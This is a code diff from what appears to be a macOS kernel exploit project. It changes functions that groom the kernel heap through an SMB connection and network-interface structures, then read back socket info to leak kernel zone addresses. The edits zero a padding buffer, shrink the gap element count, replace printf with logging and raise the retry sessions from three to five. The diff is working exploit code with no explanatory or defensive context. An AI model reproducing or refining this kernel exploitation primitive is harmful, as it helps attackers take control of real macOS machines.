@@ -20,14 +20,15 @@
 #include "neighbor_reader.h"
 #include "allocator_rw.h"
 #include "util_misc.h"
-#include "util_binary.h"
+#include "util_log.h"
 #include "platform_constants.h"
 
 
 #define NUM_PAD_ELEMENTS (XE_PAGE_SIZE / 32)
-#define NUM_GAP_ELEMENTS (XE_PAGE_SIZE / 32 * 3)
+#define NUM_GAP_ELEMENTS (XE_PAGE_SIZE / 32 * 2)
 #define NUM_SIZE_ELEMENTS (NUM_GAP_ELEMENTS * 2)
 
+#define MAX_SESSIONS 5
 #define MAX_TRIES 5
 
 
@@ -123,6 +124,7 @@ int kmem_zalloc_kext_small_try(const struct sockaddr_in* smb_addr, char* data, s
     
     uint32_t pad_infos_size = sizeof(struct network_nic_info) * NUM_PAD_ELEMENTS / 2;
     struct network_nic_info* pad_infos = malloc(pad_infos_size);
+    bzero(pad_infos, pad_infos_size);
     for (int i = 0; i < NUM_PAD_ELEMENTS / 2; i++) {
         struct network_nic_info* info = &pad_infos[i];
         info->nic_index = 0;
@@ -138,8 +140,7 @@ int kmem_zalloc_kext_small_try(const struct sockaddr_in* smb_addr, char* data, s
     memset(data_reader, 0x80, sizeof(data_reader));
         
     for (int try = 0; try < MAX_TRIES; try++) {
-        printf("try %d / %d\n", try, MAX_TRIES);
-        
+//        XE_LOG_INFO("try %d / %d", try, MAX_TRIES);
         kmem_neighbor_reader_prepare(reader, data_reader, sizeof(data_reader));
         struct socket_fdinfo modified[8];
         size_t num_modified = XE_ARRAY_SIZE(modified);
@@ -148,7 +149,7 @@ int kmem_zalloc_kext_small_try(const struct sockaddr_in* smb_addr, char* data, s
         for (int i = 0; i < num_modified; i++) {
             uintptr_t* addr = (uintptr_t*)&modified[i].psi.soi_proto.pri_un.unsi_addr.ua_sun;
             for (int j = 0; j < 32; j += 4) {
-                // may need to be improved
+                // may need to be improved for smaller alloc size
                 if (addr[j] != 0 && (addr[j] & (zone_size - 1)) == 0) {
                     out->address = addr[j];
                     error = 0;
@@ -174,8 +175,8 @@ done:
 
 
 struct kmem_zalloc_kext_small_entry kmem_zalloc_kext_small(const struct sockaddr_in* smb_addr, char* data, size_t data_size) {
-    for (int i = 0; i < 3; i++) {
-        printf("try %d / %d\n", i, 3);
+    for (int i = 0; i < MAX_SESSIONS; i++) {
+        XE_LOG_INFO("alloc session %d / %d", i, MAX_SESSIONS);
         struct kmem_zalloc_kext_small_entry entry;
         int error = kmem_zalloc_kext_small_try(smb_addr, data, data_size, &entry);
         if (!error) {
